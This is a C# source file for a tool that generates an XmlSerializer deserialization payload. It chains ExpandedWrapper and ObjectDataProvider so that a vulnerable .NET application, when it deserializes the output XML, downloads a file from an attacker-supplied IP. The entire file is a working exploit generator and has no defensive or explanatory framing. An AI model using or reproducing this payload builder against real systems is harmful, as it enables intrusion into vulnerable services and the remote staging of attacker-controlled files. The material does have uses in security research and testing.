using System;
using System.IO;
using System.Windows.Data;
using System.Net;
using System.Runtime;
using System.Runtime.Serialization;
using System.Collections;
using System.Xml.Serialization;
using System.Data.Services.Internal;
namespace ExpandedWrapperSerializer
{
    public class Program
    {
        // System.Net.WebClient can't be serialized directly(for whatever reason, don't care to learn why), so we wrap it in a class with a public member function
        public class Donkey {
            public static void hooves(string url, string file) {
               WebClient w = new System.Net.WebClient();
               w.DownloadFile(url, file);
            }
        }

        static void Main(string[] args)
        {
            if(args.Length != 2) {
                System.Console.WriteLine("Usage: expanded-wrapper-serializer ip file");
                Environment.Exit(1);
            }
            String ip = args[0];
            String file = args[1];
            String url = "http://" + ip + "/";
            ExpandedWrapper<Donkey, ObjectDataProvider> expWrap = new ExpandedWrapper<Donkey, ObjectDataProvider>();
            expWrap.ProjectedProperty0 = new ObjectDataProvider();
            expWrap.ProjectedProperty0.ObjectInstance = new Donkey();
            expWrap.ProjectedProperty0.MethodName = "hooves";
            expWrap.ProjectedProperty0.MethodParameters.Add(url);
            // Download to current directory
            expWrap.ProjectedProperty0.MethodParameters.Add(file);
            var ser = new XmlSerializer(typeof(ExpandedWrapper<Donkey, ObjectDataProvider>));
            TextWriter writer = new StreamWriter("./out.xml");
            ser.Serialize(writer, expWrap);
            writer.Close();
            Console.WriteLine("Done!");
        }
    }
}